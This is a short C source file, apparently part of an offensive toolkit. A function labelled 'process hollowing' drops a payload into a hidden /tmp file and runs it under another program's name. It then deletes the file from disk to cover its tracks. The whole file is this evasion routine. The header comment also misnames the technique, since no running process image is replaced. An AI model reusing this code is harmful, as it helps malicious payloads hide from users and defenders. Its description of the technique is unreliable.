/* Process hollowing - replace process image with new binary */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <elf.h>
#include <sys/mman.h>

bool jocky_process_hollow(const char* target, int8_t* payload, int32_t payload_size) {
    if (!target || !payload || payload_size <= 0) return false;

    char tmppath[] = "/tmp/.jocky_hl_XXXXXX";
    int fd = mkstemp(tmppath);
    if (fd < 0) return false;

    ssize_t written = write(fd, payload, (size_t)payload_size);
    close(fd);
    if (written != (ssize_t)payload_size) { unlink(tmppath); return false; }

    chmod(tmppath, 0700);

    pid_t pid = fork();
    if (pid == 0) {
        extern char** environ;
        char* argv[] = {(char*)target, NULL};
        execve(tmppath, argv, environ);
        exit(1);
    } else if (pid > 0) {
        unlink(tmppath);
        return true;
    }

    unlink(tmppath);
    return false;
}

